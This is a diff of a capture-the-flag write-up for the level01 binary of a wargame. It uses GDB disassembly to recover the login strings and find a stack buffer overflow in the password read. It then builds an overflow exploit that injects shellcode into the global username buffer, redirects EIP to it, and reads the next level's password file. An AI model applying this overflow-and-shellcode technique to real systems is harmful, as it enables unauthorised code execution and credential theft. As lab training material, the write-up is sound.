@@ -1,191 +1,236 @@
 # level01
 
-For this level, I start the same way as level00: extract the binary and inspect
-it in Binary Ninja.
-
-## What Binary Ninja does here
-
-Binary Ninja reads the compiled ELF binary and rebuilds readable pseudo-C from
-the assembly. This makes it easier to identify functions, calls, local
-variables, string references, branches, and the general program flow.
+For this level, we inspect `main`, `verify_user_name`, and `verify_user_pass` manually with GDB. We then decode the addresses found in the assembly with `decode_address.c`.
 
 ## Get the binary
 
-First read the password obtained from level00 on the host machine:
+Read the password obtained from level00:
 
 ```sh
 cat level00/flag
 ```
 
-Connect to the VM as the next user:
-
-```sh
-ssh level01@127.0.0.1 -p 2222
-```
-
-When SSH asks for a password, paste the content of `level00/flag`.
-
-After login, the prompt should look like:
-
-```text
-level01@OverRide:~$
-```
-
-From the host machine, copy the `level01` binary from the VM:
+From the repository root, copy the `level01` ELF binary from the VM:
 
 ```sh
 scp -P 2222 level01@127.0.0.1:/home/users/level01/level01 ./level01/level01
 ```
 
-This `scp` command asks for the same password from `level00/flag`.
+When `scp` asks for a password, paste the content of `level00/flag`.
 
-The local binary for analysis should be:
+The local binary should now be:
 
 ```text
 level01/level01
 ```
 
-Open this file in [Binary Ninja](https://cloud.binary.ninja/).
+This file is required by `decode_address`, which reads the ELF program headers
+and maps virtual addresses to bytes stored in the binary.
 
-## Start the analysis
+## 1. Save `main_dump_gdb`
 
-In Binary Ninja:
+On the VM, start GDB with the binary loaded:
 
-1. Open `level01`.
-2. Wait for analysis to finish.
-3. Look at the symbol list.
-4. Find `main`.
-5. Use the decompiler view or Linear Disassembly.
-
-## What `main` shows
-
-Binary Ninja gives this high-level structure:
-
-```c
-int32_t main(int32_t argc, char** argv, char** envp)
-{
-    void buf;
-
-    __builtin_memset(&buf, 0, 0x40);
-    int32_t var_14 = 0;
-
-    puts("********* ADMIN LOGIN PROMPT *********");
-    printf("Enter Username: ");
-    fgets(&a_user_name, 0x100, stdin);
-
-    if (verify_user_name())
-    {
-        puts("nope, incorrect username...\n");
-        return 1;
-    }
-
-    puts("Enter Password: ");
-    fgets(&buf, 0x64, stdin);
-
-    int32_t eax_2 = verify_user_pass(&buf);
-
-    if (eax_2 && !eax_2)
-        return 0;
-
-    puts("nope, incorrect password...\n");
-    return 1;
-}
+```sh
+gdb ./level01
 ```
 
-The important points for now:
+Save only `main` first:
 
-- `main` reads a username into the global `a_user_name`.
-- It calls `verify_user_name()`.
-- If the username check fails, the program exits.
-- Then it reads a password into a local buffer.
-- It calls `verify_user_pass(&buf)`.
+```gdb
+set disassembly-flavor intel
+set logging file /tmp/main_dump_gdb
+set logging overwrite on
+set logging on
+disas main
+set logging off
+quit
+```
 
-So the next functions to inspect in Binary Ninja are:
+From the repository root on the host, copy this first dump:
+
+```sh
+scp -P 2222 level01@127.0.0.1:/tmp/main_dump_gdb ./level01/main_dump_gdb
+```
+
+Use the content of `level00/flag` as the password.
+
+## 2. Read `main_dump_gdb`
+
+The first input is read with:
+
+```asm
+mov    DWORD PTR [esp+0x4],0x100
+mov    DWORD PTR [esp],0x804a040
+call   0x8048370 <fgets@plt>
+call   0x8048464 <verify_user_name>
+```
+
+This tells us:
+
+- `fgets` can read up to `0x100` bytes.
+- the destination is the global address `0x0804a040`.
+- the input is checked by `verify_user_name`.
+
+The second input is read with:
+
+```asm
+mov    DWORD PTR [esp+0x4],0x64
+lea    eax,[esp+0x1c]
+mov    DWORD PTR [esp],eax
+call   0x8048370 <fgets@plt>
+call   0x80484a3 <verify_user_pass>
+```
+
+The password destination is the local stack buffer at `esp + 0x1c`, and
+`fgets` is allowed to read `0x64` bytes.
+
+Most importantly, `main_dump_gdb` reveals two functions that need separate
+analysis:
+
+```asm
+call   0x8048464 <verify_user_name>
+...
+call   0x80484a3 <verify_user_pass>
+```
+
+We only know to dump these functions after finding their names in `main`.
+
+## 3. Save the verification dumps
+
+Return to the VM and open GDB again:
+
+```sh
+gdb ./level01
+```
+
+Save `verify_user_name`:
+
+```gdb
+set disassembly-flavor intel
+set logging file /tmp/username_dump_gdb
+set logging overwrite on
+set logging on
+disas verify_user_name
+set logging off
+```
+
+Save `verify_user_pass`:
+
+```gdb
+set logging file /tmp/password_dump_gdb
+set logging overwrite on
+set logging on
+disas verify_user_pass
+set logging off
+quit
+```
+
+Copy both files from the host:
+
+```sh
+scp -P 2222 level01@127.0.0.1:/tmp/username_dump_gdb ./level01/username_dump_gdb
+scp -P 2222 level01@127.0.0.1:/tmp/password_dump_gdb ./level01/password_dump_gdb
+```
+
+## 4. Prepare `decode_address`
+
+Reading the verification dumps reveals virtual addresses, but not the text
+stored at those addresses. The shared `decode_address.c` maps an ELF virtual
+address to its file offset and prints the stored string.
+
+Compile the decoder from the repository root:
+
+```sh
+gcc -Wall -Wextra -Werror decode_address.c -o decode_address
+```
+
+## 5. Decode the username addresses
+
+The relevant instructions in `username_dump_gdb` are:
+
+```asm
+mov    DWORD PTR [esp],0x8048690
+call   0x8048380 <puts@plt>
+mov    edx,0x804a040
+mov    eax,0x80486a8
+mov    ecx,0x7
+mov    esi,edx
+mov    edi,eax
+repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+```
+
+This gives three data addresses to investigate:
 
 ```text
-verify_user_name
-verify_user_pass
+0x08048690
+0x0804a040
+0x080486a8
 ```
 
-## `verify_user_name`
+Decode all three:
 
-Binary Ninja shows that this function compares the global username buffer with
-the string `dat_wil`.
-
-Relevant decompiled structure:
-
-```c
-int32_t verify_user_name()
-{
-    puts("verifying username....\n");
-
-    int32_t i = 7;
-    char* esi = &a_user_name;
-    char* edi = "dat_wil";
-
-    while (i)
-    {
-        char temp1 = *esi;
-        char temp2 = *edi;
-
-        esi = &esi[1];
-        edi = &edi[1];
-        i -= 1;
-
-        if (temp1 != temp2)
-            break;
-    }
-
-    return /* strcmp-like result */;
-}
+```sh
+./decode_address level01/level01 0x08048690
+./decode_address level01/level01 0x0804a040
+./decode_address level01/level01 0x080486a8
 ```
 
-Important point:
+Output:
 
 ```text
-username is compared with "dat_wil"
+0x08048690 (file offset 0x690): "verifying username....\n"
+0x0804a040: address is zero-initialized memory (BSS), not file data
+0x080486a8 (file offset 0x6a8): "dat_wil"
 ```
 
-## `verify_user_pass`
+This tells us:
 
-Binary Ninja shows a similar comparison for the password. The function receives
-the password buffer as `arg1` and compares it with the string `admin`.
+- `0x08048690` is the verification message passed to `puts`.
+- `0x0804a040` is the global `.bss` username buffer.
+- `0x080486a8` contains the expected username, `dat_wil`.
 
-Relevant decompiled structure:
+`repz cmps` uses `ecx = 7`, so it compares seven bytes from the username buffer
+with `dat_wil`.
 
-```c
-int32_t verify_user_pass(char* arg1)
-{
-    int32_t i = 5;
-    char* esi = arg1;
-    char* edi = "admin";
+## 6. Decode the password address
 
-    while (i)
-    {
-        char temp1 = *esi;
-        char temp2 = *edi;
+The relevant instructions in `password_dump_gdb` are:
 
-        esi = &esi[1];
-        edi = &edi[1];
-        i -= 1;
-
-        if (temp1 != temp2)
-            break;
-    }
-
-    return /* strcmp-like result */;
-}
+```asm
+mov    eax,DWORD PTR [ebp+0x8]
+mov    edx,eax
+mov    eax,0x80486b0
+mov    ecx,0x5
+mov    esi,edx
+mov    edi,eax
+repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 ```
 
-Important point:
+The address to investigate is:
 
 ```text
-password is compared with "admin"
+0x080486b0
 ```
+
+Decode it:
+
+```sh
+./decode_address level01/level01 0x080486b0
+```
+
+Output:
+
+```text
+0x080486b0 (file offset 0x6b0): "admin"
+```
+
+`repz cmps` uses `ecx = 5`, so the function compares five password bytes with
+`admin`.
 
 ## Current conclusion
 
-At this stage, Binary Ninja shows these comparison strings:
+At this stage, the GDB dumps and decoded addresses show:
 
 ```text
 username: dat_wil
@@ -208,34 +253,34 @@ nope, incorrect password...
 So `dat_wil` is the correct username, but `admin` does not give access through
 the normal password path.
 
-The suspicious part is in `main`:
+The suspicious branch in `main_dump_gdb` is:
 
-```c
-int32_t eax_2 = verify_user_pass(&buf);
-
-if (eax_2 && !eax_2)
-    return 0;
+```asm
+cmp    DWORD PTR [esp+0x5c],0x0
+je     0x8048597 <main+199>
+cmp    DWORD PTR [esp+0x5c],0x0
+je     0x80485aa <main+218>
 ```
 
-This condition cannot be true: a value cannot be both non-zero and zero at the
-same time. In practice, the program always reaches:
-
-```c
-puts("nope, incorrect password...\n");
-return 1;
-```
+If the value is zero, the first `je` jumps to the failure branch. If it is not
+zero, the identical second comparison is also not zero, so execution again
+falls into the failure branch. The normal success branch is therefore
+unreachable.
 
 This means the next step is not to find a normal password. The next thing to
-inspect is the password input buffer:
+inspect is the password input buffer. `main_dump_gdb` initializes it with:
 
-```c
-void buf;
-__builtin_memset(&buf, 0, 0x40);
-fgets(&buf, 0x64, stdin);
+```asm
+lea    ebx,[esp+0x1c]
+mov    eax,0x0
+mov    edx,0x10
+mov    edi,ebx
+mov    ecx,edx
+rep stos DWORD PTR es:[edi],eax
 ```
 
-`buf` is initialized as `0x40` bytes, but `fgets` can read `0x64` bytes. That
-suggests the password input may overflow the local buffer.
+`rep stos` clears `0x10` double words, or `0x40` bytes. Later, `fgets` receives
+the size `0x64`, so the password input can overflow that local buffer.
 
 ## Exploitation strategy
 
@@ -246,9 +291,7 @@ fgets(&a_user_name, 0x100, stdin);
 fgets(&buf, 0x64, stdin);
 ```
 
-The first `fgets` can consume at most `0x100 - 1`, or 255 bytes. If the input
-does not contain a newline in those first 255 bytes, the bytes left in the
-stream are consumed by the second `fgets`.
+The first `fgets` can consume at most `0x100 - 1`, or 255 bytes. If the input does not contain a newline in those first 255 bytes, the bytes left in the stream are consumed by the second `fgets`.
 
 This lets us build one continuous payload:
 
@@ -256,13 +299,11 @@ This lets us build one continuous payload:
 username + shellcode + padding + overwritten EIP
 ```
 
-The first 255 bytes are stored in the global username buffer. The remaining
-bytes are read into the vulnerable password buffer.
+The first 255 bytes are stored in the global username buffer. The remaining bytes are read into the vulnerable password buffer.
 
 ## Find the cyclic offset
 
-Start the payload with the required username, fill the rest of the first input,
-then append a cyclic pattern in gdb:
+Start the payload with the required username, fill the rest of the first input, then append a cyclic pattern in gdb:
 
 ```gdb
 r < <(python -c 'print "dat_wil" + "\x90" * (256 - 7) + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
@@ -281,16 +322,13 @@ Searching this value in the cyclic pattern gives:
 79
 ```
 
-The pattern offset is 79 because one byte from the 256-byte prefix remains
-after the first `fgets` consumes its maximum of 255 bytes. Therefore the second
-`fgets` receives:
+The pattern offset is 79 because one byte from the 256-byte prefix remains after the first `fgets` consumes its maximum of 255 bytes. Therefore the second `fgets` receives:
 
 ```text
 1 leftover byte + 79 pattern bytes + overwritten EIP
 ```
 
-This agrees with the earlier result that saved EIP is reached after 80 bytes in
-the second buffer.
+This agrees with the earlier result that saved EIP is reached after 80 bytes in the second buffer.
 
 ## Store the shellcode
 
@@ -322,9 +360,7 @@ ecx = 0           argv
 edx = 0           envp
 ```
 
-The shellcode avoids null bytes inside the injected byte sequence because a
-null byte could terminate string-based input handling before the full payload
-is copied.
+The shellcode avoids null bytes inside the injected byte sequence because a null byte could terminate string-based input handling before the full payload is copied.
 
 The global username buffer starts at:
 
@@ -332,8 +368,7 @@ The global username buffer starts at:
 0x0804a040
 ```
 
-The first seven bytes must contain `dat_wil`. The shellcode begins immediately
-afterward, at:
+The first seven bytes must contain `dat_wil`. The shellcode begins immediately afterward, at:
 
 ```text
 0x0804a040 + 7 = 0x0804a047
@@ -345,8 +380,7 @@ On x86, the address must be written in little-endian byte order:
 0x0804a047 -> \x47\xa0\x04\x08
 ```
 
-The expression below starts with the address in normal byte order and reverses
-it:
+The expression below starts with the address in normal byte order and reverses it:
 
 ```python
 "\x08\x04\xa0\x47"[::-1]
@@ -378,9 +412,7 @@ print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]
 '''; echo 'cat /home/users/level02/.pass') | ./level01
 ```
 
-The username check reads `dat_wil`, the shellcode remains in `a_user_name`, the
-second `fgets` overflows saved EIP, and execution returns to the shellcode at
-`0x0804a047`.
+The username check reads `dat_wil`, the shellcode remains in `a_user_name`, the second `fgets` overflows saved EIP, and execution returns to the shellcode at `0x0804a047`.
 
 The flag is:
 
